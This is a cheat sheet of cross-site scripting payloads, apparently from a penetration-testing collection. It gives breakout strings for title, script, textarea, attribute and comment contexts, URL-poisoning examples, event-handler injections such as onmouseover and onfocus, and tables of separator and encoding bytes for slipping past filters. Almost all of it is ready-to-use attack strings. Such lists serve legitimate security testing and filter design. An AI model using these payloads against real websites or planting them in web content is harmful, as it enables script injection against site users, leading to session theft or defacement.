# Simple HTML Injection

## Simple Examples

### Tag Block Breakout
Use when input lands inside or between opening/closing of some tags like
title, style, script, iframe, noscript and textarea, respectively .
```html
</title><svg onload=alert(1)>
</style><svg onload=alert(1)>
</script><svg onload=alert(1)>
</iframe><svg onload=alert(1)>
</noscript><svg onload=alert(1)>
</textarea><svg onload=alert(1)>
```

### URL poison
```html
http://brutelogic.com.br/xss.php/”><svg onload=alert(document.domain)>
http://brutelogic.com.br/xss.php?a=<svg onload=alert(document.domain)>
#Input sometimes land into a javascript block (script tags), usually in the value of some variable of the code. But because the HTML tags has priority in the browser’s parsing, we can simple terminate the block and insert a new tag.
http://brutelogic.com.br/xss.php?c1=</script><svg onload=alert(1)>
```

### Attribute Breakout
Use when input lands inside an attribute’s value of an HTML tag or outside tag
except the ones described in the “Tag Block Breakout” case below.

```html
"><svg onload=alert(1)>
"><script>alert(1)</script>
```

### Comments Breakout
Use when input lands inside comments section (between <!-- and -->) of
HTML document.

```html
--><svg onload=alert(1)>
--><script>alert(1)</script>
```

## Semi-Complex Examples

### Inline HTML Injection
Use when input lands inside an attribute’s value of an HTML tag but that tag
can’t be terminated by greater than sign (>).

```html
"onmouseover="alert(1)
"onmouseover=alert(1)//
"autofocus onfocus="alert(1)
"autofocus onfocus=alert(1)//
http://brutelogic.com.br/xss.php?b1=”><svg onload=alert(1)>
```

### Vector Scheme Examples
The following schemes shows all chars and bytes allowed as separators or
valid syntax. “ENT” means HTML ENTITY and it means that any of the allowed
chars or bytes can be used in their HTML entity forms (string and numeric).

Notice the “javascript” word might have some bytes in between or not and all
of its characters can also be URL or HTML encoded.

#### Vector Scheme 1 (tag name + handler)
```html
<svg[1]onload[2]=[3]alert(1)[4]>
[1]: SPACE, +, /, %09, %0A, %0C,%0D, %20, %2F
[2]: SPACE, +, %09, %0A, %0C,%0D, %20
[3]: SPACE, +, ", ', %09, %0A, %0B, %0C,%0D, %20, %22, %27,
[4]: SPACE, +, ", ', %09, %0A, %0B, %0C,%0D, %20, %22, %27
```

#### Vector Scheme 2 (tag name + attribute + handler)
```html
<img[1]src[2]=[3]k[4]onerror[5]=[6]alert(1)[7]>
[1]: SPACE, +, /, %09, %0A, %0C,%0D, %20, %2F
[2]: SPACE, +, %09, %0A, %0C,%0D, %20
[3]: SPACE, +, ", ', %09, %0A, %0C,%0D, %20, %22, %27
[4]: SPACE, +, ", ', %09, %0A, %0C,%0D, %20, %22, %27
[5]: SPACE, +, %09, %0A, %0C,%0D, %20
[6]: SPACE, +, ", ', %09, %0A, %0B, %0C,%0D, %20, %22, %27
[7]: SPACE, +, ", ', %09, %0A, %0B, %0C,%0D, %20, %22, %27
```

#### Vector Scheme 3 (tag name + href|src|data|action|formaction)
The [?], [4] and [5] fields can only be used if [3] and [6] are single or double
quotes.

```html
<a[1]href[2]=[3]javas[?]cript[4]:[5]alert(1)[6]>
[1]: SPACE, +, /, %09, %0A, %0C,%0D, %20, %2F
[2]: SPACE, +, %09, %0A, %0C,%0D, %20
[3]: SPACE, +, ", ', [%01 - %0F], [%10 - %1F], %20, %22, %27, ENT
[?]: %09, %0A, %0D, ENT
[4]: %09, %0A, %0D, ENT
[5]: SPACE, +, %09, %0A, %0B, %0C,%0D, %20
[6]: SPACE, +, ", ', %09, %0A, %0B, %0C,%0D, %20, %22, %27 
```